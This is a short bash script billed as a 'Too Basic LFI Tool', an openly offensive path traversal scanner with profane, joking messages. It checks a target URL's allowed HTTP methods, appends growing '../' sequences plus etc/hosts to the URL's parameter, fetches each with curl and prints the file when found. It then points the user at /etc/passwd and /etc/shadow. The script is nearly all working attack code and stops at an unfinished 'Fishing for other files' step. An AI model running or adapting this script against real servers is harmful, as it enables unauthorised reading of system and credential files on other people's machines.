#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD=' \033[1m'

echo -e "${BLUE}${BOLD}T O O   B A S I C   L F I   T O O L${RESET}"

echo "       ┓    •   ┓┏•       ┓"
echo "╋┏┓┏┓  ┣┓┏┓┏┓┏  ┃╋┓  ╋┏┓┏┓┃"
echo "┗┗┛┗┛  ┗┛┗┻┛┗┗  ┗┛┗  ┗┗┛┗┛┗"


echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK"
echo 
echo

url="$1"

echo "Requesting the server which methods are allowed..."

connexion_test=$(curl -s -o /dev/null -w "%{http_code}" "$url")

echo "$connexion_test"
if [ "$connexion_test" -ge 408 ] || [ "$connexion_test" -eq 0 ]; then 
echo -e "${RED}Maybe you should think about having an actual connexion lmao (check your fucking interfaces man)${RESET}"
exit 1

else

        methods=$(curl -s -I -X OPTIONS "$url" | grep  -i  "Allow:")
        if  [ -n "$methods" ]; then 
                if  echo  "$methods" | grep -i "POST" ; then 
                echo -e "${GREEN}Request POST allowed{RESET}"
        fi
        if  echo  "$methods" | grep -i "GET" ; then 
                echo -e "${GREEN}Request GET allowed${RESET}"
        fi
if  echo "$methods" | grep -i "HEAD" ;then 
echo -e "${GREEN}Request HEAD allowed${RESET}"
fi
 
else 
echo -e "${RED}${BOLD}Server sets in no sniffing mode : *womp womp sound*${RESET}"

fi

echo 
echo "How deep is your love, my deer?" 

depth=5
for ((i=1; i<=depth; i++)); do
query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
url2="${url}${query}"
echo -e "${YELLOW}Stade ${i} recursion${RESET}"
echo "$url2" 
echo "Searching for /etc/hosts file..."
file=$(curl -s "$url2")
if  echo "$file" | grep -s -i "localhost" ; then 
echo -e "${GREEN}${BOLD}It seems we find something interesting${RESET}"
print=$(curl -s "$url2")
echo -e "${GREEN}$print${RESET}"


echo "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or /etc/shadow"
echo "Have a wonderful look dude"
exit 0
else
echo -e "${RED}Gotta dive deeper, my friend${RESET}"
fi
done 
echo "25% finished"


fi

echo "Let's try something else"
echo "Fishing for other files"

